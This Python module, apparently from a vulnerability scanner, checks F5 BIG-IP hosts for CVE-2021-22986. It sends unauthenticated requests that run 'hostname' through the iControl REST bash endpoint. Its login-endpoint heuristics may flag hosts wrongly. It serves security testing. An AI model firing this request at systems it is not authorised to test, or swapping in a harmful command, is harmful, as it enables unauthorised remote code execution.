import requests
import json
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2021_22986(ip, ports=None, timeout=5):
    """
    Check for CVE-2021-22986 - Unauthenticated RCE in F5 BIG-IP
    This vulnerability in the iControl REST interface allows unauthenticated attackers 
    to execute arbitrary system commands
    """
    if ports is None:
        ports = [443, 8443]  # Default BIG-IP management ports
    else:
        ports = [int(port) for port in ports]
    
    headers = {
        "User-Agent": user_agents(),
        "Content-Type": "application/json",
        "X-F5-Auth-Token": "",
        "Authorization": ""
    }
    
    payload = {
        "command": "run",
        "utilCmdArgs": "-c 'hostname'"
    }
    
    vulnerable = False
    
    for port in ports:
        endpoints = [
            f"https://{ip}:{port}/mgmt/tm/util/bash",
            f"https://{ip}:{port}/mgmt/shared/authn/login"
        ]
        
        for url in endpoints:
            try:
                response = requests.post(
                    url, 
                    headers=headers, 
                    json=payload, 
                    verify=False, 
                    timeout=timeout
                )
                
                if response.status_code == 200 and "commandResult" in response.text:
                    vulnerable = True
                    hostname = json.loads(response.text).get("commandResult", "").strip()
                    print_colour(f"[+] The target is vulnerable to CVE-2021-22986 (F5 BIG-IP Unauthenticated RCE): {url}")
                    print_colour(f"[+] Hostname: {hostname}")
                    return True
                    
                # Check login endpoint response for vulnerability indicators
                if "token" in response.text and "userReference" in response.text:
                    vulnerable = True
                    print_colour(f"[+] The target is vulnerable to CVE-2021-22986 (F5 BIG-IP Unauthenticated RCE): {url}")
                    print_colour(f"[+] Authentication bypass successful")
                    return True
                    
            except requests.RequestException:
                continue
    
    for port in ports:
        url = f"https://{ip}:{port}/mgmt/shared/authn/login"
        try:
            response = requests.post(
                url,
                headers={"Content-Type": "application/json"},
                data="{}",
                verify=False,
                timeout=timeout
            )
            
            if response.status_code != 401 and "Missing required parameter" in response.text:
                vulnerable = True
                print_colour(f"[+] The target is likely vulnerable to CVE-2021-22986 (F5 BIG-IP Unauthenticated RCE): {url}")
                return True
                
        except requests.RequestException:
            continue
    
    return vulnerable 